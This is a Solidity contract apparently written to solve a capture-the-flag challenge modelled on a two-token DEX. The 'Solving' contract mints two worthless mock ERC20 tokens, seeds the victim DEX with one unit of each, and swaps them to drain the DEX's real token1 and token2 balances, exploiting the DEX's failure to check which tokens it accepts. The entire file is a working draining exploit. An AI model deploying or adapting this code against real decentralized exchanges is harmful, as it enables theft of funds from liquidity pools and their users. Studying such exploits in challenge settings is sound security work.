// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex2 {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Token is ERC20("Mock", "MOCK") {
    constructor() {
        _mint(_msgSender(), type(uint256).max - 1);
    }
}

contract Solving {
    IDex2 dex2;
    Token new_Token1;
    Token new_Token2;

    function solve(address _victim) external {

        dex2 = IDex2(_victim);
        new_Token1 = new Token();
        new_Token2 = new Token();

        address token1 = dex2.token1();
        address token2 = dex2.token2();
        IERC20(new_Token1).transfer(address(dex2), 1);
        IERC20(new_Token2).transfer(address(dex2), 1);
        IERC20(new_Token1).approve(address(dex2), type(uint256).max);
        IERC20(new_Token2).approve(address(dex2), type(uint256).max);
        dex2.swap(address(new_Token1), token1, 1);
        dex2.swap(address(new_Token2), token2, 1);
    }
}
